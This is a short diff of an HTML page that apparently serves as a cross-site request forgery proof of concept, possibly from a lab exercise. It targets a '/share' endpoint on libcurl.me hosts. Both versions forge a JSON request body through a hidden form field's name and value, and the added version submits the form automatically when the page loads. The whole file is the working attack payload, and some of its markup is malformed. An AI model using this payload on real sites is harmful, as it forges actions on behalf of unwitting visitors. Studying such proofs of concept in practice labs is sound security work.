@@ -1,11 +1,8 @@
 <html>
-<body>
-Hello saikoron
-<form id="csrf" action="https://ptl-fd9dae7af6ea-24390c3a9f52.libcurl.me/share" method="POST" enctype="application/json" >
-<input type="hidden" name='{"user":"test","id":0' value='"}' >
-<button>submit</button>
-</form>
-
-
+<body onload="document.form[0].submit()">
+<form method="post" action="http://ptl-b61b0c01ce5f-f998766ae3e1.libcurl.me/share" >
+<input type="hidden" name='{"user":"test","id":0' value='"}'>
+<button type="submit">test</button>  
+</form method="POST" class="form-class">
 </body>
 </html>
